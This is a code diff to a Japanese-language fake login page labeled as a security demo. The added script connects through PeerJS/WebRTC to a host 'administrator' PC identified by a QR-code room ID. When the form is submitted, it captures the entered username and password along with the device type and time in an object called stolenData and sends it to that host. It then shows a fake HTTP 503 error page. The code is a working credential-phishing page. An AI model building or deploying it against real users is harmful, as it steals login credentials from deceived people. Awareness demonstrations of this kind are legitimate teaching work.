@@ -5,6 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ログイン | セキュリティ確認（デモ）</title>
   <link rel="stylesheet" href="style.css">
+  <!-- PeerJSの読み込み -->
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 </head>
 <body class="victim-body">
   
@@ -31,11 +33,16 @@
         <label>パスワード</label>
         <input type="password" id="password" placeholder="••••••••" required>
       </div>
-      <button type="submit" id="login-btn" class="btn-primary">ログイン</button>
+      <!-- 接続できるまでボタンを押せなくする -->
+      <button type="submit" id="login-btn" class="btn-primary" disabled style="opacity: 0.5; cursor: not-allowed;">接続待機中...</button>
     </form>
+    <!-- 接続状態の表示用テキスト -->
+    <div style="margin-top: 12px; font-size: 12px; color: #ffaa00; text-align: center;" id="conn-status">
+      ⏳ PC管理者との接続を確立しています...
+    </div>
   </div>
 
-  <!-- ⚠️ エラー画面（ログインを押した後にスマホに表示され、そのまま留まる） -->
+  <!-- ⚠️ エラー画面（ログイン後にスマホで表示され、そのまま留まる） -->
   <div class="login-container hidden" id="error-box">
     <div class="error-icon">⚠️</div>
     <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
@@ -43,14 +50,82 @@
   </div>
 
   <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const roomId = urlParams.get('room'); // PCのルームIDを取得
+
+    const loginBtn = document.getElementById('login-btn');
+    const connStatus = document.getElementById('conn-status');
+
+    // 接続スピードと安定性を高めるため、Google等のSTUNサーバーを指定
+    let peer = new Peer({
+      config: {
+        'iceServers': [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:global.stun.twilio.com:3478' }
+        ]
+      }
+    });
+    let conn = null;
+
+    peer.on('open', () => {
+      if (roomId) {
+        connStatus.innerText = "⚡ PCへ高速接続中...";
+        // PC（ホスト）へ接続を要求
+        conn = peer.connect("sec-demo-" + roomId, { reliable: true });
+        
+        conn.on('open', () => {
+          // 🔗 接続成功！ボタンを押せるように解放する
+          loginBtn.disabled = false;
+          loginBtn.style.opacity = "1";
+          loginBtn.style.cursor = "pointer";
+          loginBtn.innerText = "ログイン";
+          
+          connStatus.innerText = "🟢 接続完了（リアルタイム通信確立）";
+          connStatus.style.color = "#2ed573";
+        });
+
+        conn.on('error', (err) => {
+          connStatus.innerText = "❌ 接続エラー（再読み込みしてください）";
+          connStatus.style.color = "#ff4757";
+        });
+      } else {
+        connStatus.innerText = "⚠️ 接続先IDがありません（QRコードからアクセスしてください）";
+        connStatus.style.color = "#ff4757";
+      }
+    });
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      if (ua.includes("iPhone")) return "iPhone (iOS)";
+      if (ua.includes("iPad")) return "iPad (iOS)";
+      if (ua.includes("Android")) return "Androidスマホ";
+      if (ua.includes("Windows")) return "Windows PC";
+      if (ua.includes("Mac")) return "Mac PC";
+      return "不明な端末";
+    }
+
     document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // ログインボタンを押したら、フォームを隠してエラー画面を表示し、そこで完全にストップ！
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const device = getDeviceInfo();
+      const time = new Date().toLocaleTimeString();
+
+      const stolenData = { time, device, username, password };
+
+      // PC（管理者画面）へリアルタイムでデータを送信！
+      if (conn && conn.open) {
+        conn.send(stolenData);
+      } else {
+        alert("PCとの接続が切断されています。");
+        return;
+      }
+
+      // スマホ側はエラー画面を表示してその場でストップ
       document.getElementById('login-box').classList.add('hidden');
       document.getElementById('error-box').classList.remove('hidden');
     });
   </script>
 </body>
 </html>
-
